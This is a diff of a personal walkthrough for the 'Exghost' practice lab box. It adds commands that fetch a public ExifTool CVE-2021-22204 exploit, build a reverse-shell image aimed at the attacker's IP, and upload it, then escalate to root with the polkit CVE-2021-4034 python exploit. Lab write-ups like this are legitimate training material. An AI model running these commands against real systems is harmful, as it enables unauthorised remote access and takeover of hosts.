@@ -3,7 +3,13 @@ Name: Exghost
 Date:  04/09/2022
 Difficulty:  Easy
 Goals:  OSCP
-Learnt: This wordlist for ftp default creds `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`
+Learnt: 
+- This wordlist for ftp default creds `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`
+- Importance of manual PrivEnum
+- No compiler no worries go python3 exploit
+- 
+
+![](kali.jpg)
 
 Reupload after failure with markdown image sizing
 `
@@ -27,16 +33,27 @@ Post the Pentest Monkey PHP reverse shell!
 ![](curlnoworko.png)
 
 
-## Exploit
+## Exploit && Foothold
+Can back to finish this walkthrough; there is a [remote code execution](https://github.com/AssassinUKG/CVE-2021-22204) for EXifTool 12.23 
+```bash
+wget https://raw.githubusercontent.com/AssassinUKG/CVE-2021-22204/main/CVE-2021-22204.sh
+chmod +x CVE-2021-22204.sh
+bash CVE-2021-22204.sh "reverseme $ip 80" kali.jpg
+curl -F myFile=@kali.jpg http://192.168.141.183/exiftest.php
+```
 
-There is only one exploit for Exiftool on Searchsploit, that is this for the exact same version 12.23! 
+![](upload-succesful.png)
 
-![](50911.png)
-
-
-
-## Foothold
 
 ## PrivEsc
 
-      
+![](linenumone.png)
+
+LinEnum does not check expoitable apts, manually:
+```bash
+apt list --upgradeable
+```
+
+I started work on a script to searchsploit the a list of vulnerable apts, but I need to either make something workable with json as the output for bash weird even with the `--colour` flag...away polkit-1 is vulnerable to [CVE-2021-4034](https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py). Because this Ubuntu box does not have gcc this is a python3 exploit.
+
+![](root.png)
